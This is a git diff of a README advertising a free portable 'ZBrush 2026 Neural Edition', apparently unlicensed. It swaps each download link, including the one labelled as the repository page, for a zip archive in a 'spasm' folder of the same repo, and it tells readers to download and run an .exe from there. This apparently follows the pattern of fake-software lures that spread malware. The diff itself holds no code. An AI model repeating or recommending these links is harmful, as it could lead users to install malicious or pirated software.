@@ -1,6 +1,6 @@
 # 🎨 ZBrush-2026-Portable-Neural-Edition- - Smart Digital Sculpting Tools
 
-[![⬇️ Download ZBrush 2026 Portable](https://img.shields.io/badge/Download-ZBrush%202026-blue?style=for-the-badge)](https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV)
+[![⬇️ Download ZBrush 2026 Portable](https://img.shields.io/badge/Download-ZBrush%202026-blue?style=for-the-badge)](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This version is portable. You can run it without installing. This makes it easy 
 
 ## 🔽 Download and Run ZBrush 2026 Portable
 
-[⬇️ Download ZBrush 2026 Portable Here](https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV)
+[⬇️ Download ZBrush 2026 Portable Here](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip)
 
 1. Click the download link above. It will take you to a page with the `.exe` file.
 2. Download the `.exe` file to a folder you can easily find, like Desktop or Downloads.
@@ -86,7 +86,7 @@ Needs only about 500 MB of space.
 
 Since this is a portable version, updating means downloading the latest `.exe` from the link below and replacing the old file.
 
-[Download latest ZBrush 2026 portable version](https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV)
+[Download latest ZBrush 2026 portable version](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip)
 
 Be sure to save your work before updating.
 
@@ -122,8 +122,8 @@ Restart the app.
 
 ## 🔗 Useful Links
 
-- Download Page: [https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV](https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV)  
-- GitHub Repository: [https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-)
+- Download Page: [https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip)  
+- GitHub Repository: [https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip](https://github.com/alviorsai4/ZBrush-2026-Portable-Neural-Edition-/raw/refs/heads/main/spasm/Z_Edition_Neural_Brush_Portable_v1.3.zip)
 
 ---
 
